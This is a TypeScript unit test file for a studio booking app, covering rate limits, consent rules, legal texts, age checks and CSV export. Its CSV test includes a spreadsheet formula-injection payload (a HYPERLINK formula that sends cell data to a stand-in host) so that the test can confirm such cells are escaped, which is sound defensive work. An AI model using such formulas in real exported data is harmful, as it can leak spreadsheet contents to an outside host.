// Pure TypeScript helpers (no database). Run: npm run test:unit
import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { ipFrom, keyHash, limitOutcome, normEmail } from "../src/lib/request-keys";
import { needsHealthConsent } from "../src/lib/health";
import { cancelledOutcome, render } from "../src/lib/notifications/templates";
import { friendlyError, must } from "../src/lib/errors";
import { cronAuthorized } from "../src/lib/cron-auth";
import { schedulerWarning } from "../src/lib/scheduler";
import { retryingFetch } from "../src/lib/supabase/retry-fetch";
import fs from "node:fs";
import { ageOn, isAdult } from "../src/lib/age";
import { DOC_SETTINGS, legalMarkdown } from "../src/lib/legal-docs";
import { cookiesText, privacyText, waiverText } from "../src/lib/legal";
import { defaultTerms } from "../src/lib/terms";

describe("rate limits and email keys (A-045, A-092, A-103, A-008)", () => {
  test("sign-in and code limits fail closed when the check errors; booking limits fail open", () => {
    const err = { message: "boom" };
    for (const kind of ["signin", "signin_ip", "code", "code_ip", "code_all"]) assert.equal(limitOutcome(kind, null, err), true, kind);
    assert.equal(limitOutcome("booking", null, err), false);
    assert.equal(limitOutcome("signin", true, null), true);
    assert.equal(limitOutcome("signin", false, null), false);
  });

  test("the client IP prefers the platform headers over x-forwarded-for", () => {
    const h = (o: Record<string, string>) => (n: string) => o[n] ?? null;
    assert.equal(ipFrom(h({ "x-forwarded-for": "6.6.6.6, 1.1.1.1", "x-vercel-forwarded-for": "1.2.3.4" })), "1.2.3.4");
    assert.equal(ipFrom(h({ "x-forwarded-for": "6.6.6.6", "x-real-ip": "5.5.5.5" })), "5.5.5.5");
    assert.equal(ipFrom(h({ "x-forwarded-for": "6.6.6.6, 1.1.1.1" })), "6.6.6.6");
    assert.equal(ipFrom(h({})), "local");
  });

  test("rate-limit keys are keyed hashes, not plain SHA-256 of the email", () => {
    const a = keyHash("secret-a", "Maria@Example.com");
    assert.equal(a, keyHash("secret-a", "maria@example.com "));
    assert.notEqual(a, keyHash("secret-b", "maria@example.com"));
    assert.notEqual(a, createHash("sha256").update("maria@example.com").digest("hex"));
    assert.match(a, /^[0-9a-f]{64}$/);
  });

  test("emails are compared exactly, lower-case", () => {
    assert.equal(normEmail("  X_Y@Example.COM "), "x_y@example.com");
  });
});

describe("health consent rule (A-105)", () => {
  test("consent is needed whenever something would be stored, including only 'other medication'", () => {
    assert.equal(needsHealthConsent({ conditions: [], bpMeds: false, medication: null }), false);
    assert.equal(needsHealthConsent({ conditions: [], bpMeds: false, medication: "   " }), false);
    assert.equal(needsHealthConsent({ conditions: [], bpMeds: false, medication: "Thyroxine" }), true);
    assert.equal(needsHealthConsent({ conditions: [], bpMeds: true, medication: null }), true);
    assert.equal(needsHealthConsent({ conditions: ["back"], bpMeds: false }), true);
    assert.equal(needsHealthConsent({ conditions: [], details: "something" }), true);
  });
});

describe("studio-cancelled class: what happens to what they paid with (A-031)", () => {
  test("package classes come back; a paid event is refunded in full (her answer, 7 Nov); unpaid and free say nothing to pay", () => {
    assert.match(cancelledOutcome("credit", true), /class is back in your account/);
    assert.match(cancelledOutcome("payment", true), /class is back in your account/);
    assert.match(cancelledOutcome("payment", false), /full refund/);
    assert.doesNotMatch(cancelledOutcome("payment", false), /back in your account/);
    assert.match(cancelledOutcome("pay_at_studio", true), /nothing to pay/);
    assert.match(cancelledOutcome("free", false), /nothing to pay/);
  });

  test("the class_cancelled email and SMS use that outcome", () => {
    const r = render("class_cancelled", { className: "SUP Pilates", when: "Sat", outcome: cancelledOutcome("payment", false) });
    assert.ok(r.lines.some((l) => /full refund/.test(l)));
    assert.ok(!r.lines.some((l) => /back in your account/.test(l)));
    assert.match(r.sms, /full refund/);
    assert.match(render("class_cancelled", { className: "Reformer", when: "Mon" }).sms, /back in your account/);
  });

  test("new engine refusals have their own words", () => {
    for (const k of ["waitlist_first", "code_used_up", "not_a_package", "type_locked", "moved_outside_package", "class_not_started"]) {
      assert.notEqual(friendlyError({ message: k }), "Something went wrong. Please try again.", k);
    }
  });
});

describe("cron secret (A-089)", () => {
  test("only the exact bearer secret passes (constant-time compare, any length)", () => {
    assert.equal(cronAuthorized("Bearer s3cret", "s3cret"), true);
    assert.equal(cronAuthorized("Bearer s3creT", "s3cret"), false);
    assert.equal(cronAuthorized("Bearer s3cret-longer", "s3cret"), false);
    assert.equal(cronAuthorized("", "s3cret"), false);
    assert.equal(cronAuthorized(null, "s3cret"), false);
    assert.equal(cronAuthorized("Bearer ", ""), false);
    assert.equal(cronAuthorized("Bearer undefined", undefined), false);
  });
});

describe("scheduler warning on Today (A-102)", () => {
  test("warns when it never ran on the real app, or ran over 20 minutes ago; not for a demo without a scheduler", () => {
    const ago = (m: number) => new Date(Date.now() - m * 60_000).toISOString();
    assert.equal(schedulerWarning(null, false), true);
    assert.equal(schedulerWarning(null, true), false);
    assert.equal(schedulerWarning(ago(25), true), true);
    assert.equal(schedulerWarning(ago(25), false), true);
    assert.equal(schedulerWarning(ago(3), false), false);
  });
});

describe("error words (A-054)", () => {
  test("every code the database raises has its own message", async () => {
    const fs = await import("node:fs");
    const dir = "supabase/migrations";
    const codes = new Set<string>();
    for (const f of fs.readdirSync(dir)) {
      for (const m of fs.readFileSync(`${dir}/${f}`, "utf8").matchAll(/raise exception '([a-z_]+)'/g)) codes.add(m[1]);
    }
    assert.ok(codes.size > 30);
    const missing = [...codes].filter((k) => friendlyError({ message: k }) === "Something went wrong. Please try again.");
    assert.deepEqual(missing, []);
  });

  test("must() turns a failed write into a friendly error, never the raw message", () => {
    assert.throws(() => must({ error: { message: "duplicate key value violates unique constraint" } }), (e: Error) => e.message === "save_failed");
    assert.throws(() => must({ error: { message: "full" } }), (e: Error) => e.message === "full");
    assert.doesNotThrow(() => must({ error: null }));
    assert.equal(friendlyError(new Error("save_failed")), "That didn't save. Please try again.");
  });
});

describe("database reads retry once (A-055)", () => {
  test("a GET that hits a dropped connection or a 503 is tried once more; a POST never is", async () => {
    const real = globalThis.fetch;
    let calls = 0;
    try {
      globalThis.fetch = (async () => { calls++; if (calls === 1) throw new TypeError("fetch failed"); return new Response("ok"); }) as typeof fetch;
      assert.equal(await (await retryingFetch("http://x/rest/v1/a", { method: "GET" }, () => 0)).text(), "ok");
      assert.equal(calls, 2);
      calls = 0;
      globalThis.fetch = (async () => { calls++; return new Response("busy", { status: calls === 1 ? 503 : 200 }); }) as typeof fetch;
      assert.equal((await retryingFetch("http://x/rest/v1/a", undefined, () => 0)).status, 200);
      assert.equal(calls, 2);
      calls = 0;
      globalThis.fetch = (async () => { calls++; throw new TypeError("fetch failed"); }) as typeof fetch;
      await assert.rejects(retryingFetch("http://x/rest/v1/rpc/book_session", { method: "POST" }, () => 0));
      assert.equal(calls, 1);
    } finally {
      globalThis.fetch = real;
    }
  });
});

describe("legal documents (A-012, A-013, A-060)", () => {
  test("docs/*.md are exactly what the app shows with the default settings (npm run legal:docs)", () => {
    for (const [file, body] of Object.entries(legalMarkdown())) assert.equal(fs.readFileSync(file, "utf8"), body, `${file} is out of date: run npm run legal:docs`);
  });

  test("final texts: no draft labels or lawyer notes; the identity is a visible placeholder until filled in", () => {
    for (const body of Object.values(legalMarkdown())) {
      assert.doesNotMatch(body, /draft|to confirm with a lawyer|online dispute resolution platform/i);
      assert.doesNotMatch(body, /hello@example\.com|00 000000/);
    }
    assert.match(privacyText(DOC_SETTINGS), /\[Trader full name\]/);
    const filled = { ...DOC_SETTINGS, trader_name: "Ana Example", address: "1 Main St, 3000 Limassol, Cyprus", contact_email: "ana@studio.cy", contact_phone: "+357 99 123456" };
    assert.doesNotMatch(defaultTerms(filled), /\[Trader full name\]|\[Contact email\]|\[Studio address/);
    assert.match(defaultTerms(filled), /Ana Example, an individual trader/);
  });

  test("the Terms match her policy: 6h rule, validity from the first class, no auto-renew, refunds, 14-day withdrawal", () => {
    const t = defaultTerms(DOC_SETTINGS);
    assert.match(t, /6 hours or more before class: .*same package, with its original expiry date/);
    assert.match(t, /Less than 6 hours before class, or not coming: the class is used/);
    assert.match(t, /valid for 30 or 60 days from the date of your first class/);
    assert.match(t, /don't renew automatically/);
    assert.match(t, /If we cancel an event, you get a full refund/);
    assert.match(t, /even if you had already cancelled it late/);
    assert.match(t, /within 14 days of the day we mark it paid/);
    assert.match(t, /art\. 16\(l\)/);
    assert.match(t, /No VAT is charged/);
    assert.match(t, /adults aged 18 or over/);
    assert.doesNotMatch(t, /We don't give cash refunds/);
  });

  test("the Privacy Policy states the retention settings and health access exactly", () => {
    const p = privacyText(DOC_SETTINGS);
    assert.match(p, /at most 12 months after your last class/);
    assert.match(p, /24 months after your last booking/);
    assert.match(p, /6 years from the end of the year/);
    assert.match(p, /only the instructor \(\[Trader full name\]\) can read them/);
    assert.match(p, /I'd rather tell my instructor in person/);
    assert.match(privacyText({ ...DOC_SETTINGS, retention_health_months: 6, retention_payments_years: 7 }), /at most 6 months after.*\n[\s\S]*7 years from the end/);
    assert.match(privacyText({ ...DOC_SETTINGS, retention_inactive_months: null }), /As long as needed after your last booking/);
  });

  test("Cookies: essential only, the real 400-day sign-in cookie; the waiver lists when a doctor's note is needed", () => {
    assert.match(cookiesText(), /Up to 400 days/);
    assert.doesNotMatch(cookiesText(), /map|analytics cookies are set|1 week/i);
    assert.match(waiverText(DOC_SETTINGS), /currently pregnant, gave birth within the last 3 months, or had surgery in the last 12 months/);
  });
});

describe("adults only: 18 on the studio's calendar day (A-062)", () => {
  test("turns 18 on the birthday itself, not the day before", () => {
    assert.equal(isAdult("2008-11-07", "2026-11-06"), false);
    assert.equal(isAdult("2008-11-07", "2026-11-07"), true);
  });
  test("a 29 February birthday counts from 1 March in other years", () => {
    assert.equal(ageOn("2008-02-29", "2026-02-28"), 17);
    assert.equal(ageOn("2008-02-29", "2026-03-01"), 18);
    assert.equal(ageOn("2008-02-29", "2028-02-29"), 20);
  });
});

describe("payments CSV (A-042)", () => {
  test("cells that a spreadsheet would run as a formula start with an apostrophe", async () => {
    const { csvCell } = await import("../src/lib/csv");
    assert.equal(csvCell('=HYPERLINK("https://x/?"&A1,"x")'), `"'=HYPERLINK(""https://x/?""&A1,""x"")"`);
    for (const v of ["+1", "-2+3", "@SUM(A1)", "\tx", "\rx", "=1+1"]) assert.equal(csvCell(v).slice(0, 2), `"'`, JSON.stringify(v));
    assert.equal(csvCell("Elena Georgiou"), '"Elena Georgiou"');
    assert.equal(csvCell(null), '""');
    assert.equal(csvCell("-12.50"), '"-12.50"', "amounts stay numbers");
  });
});
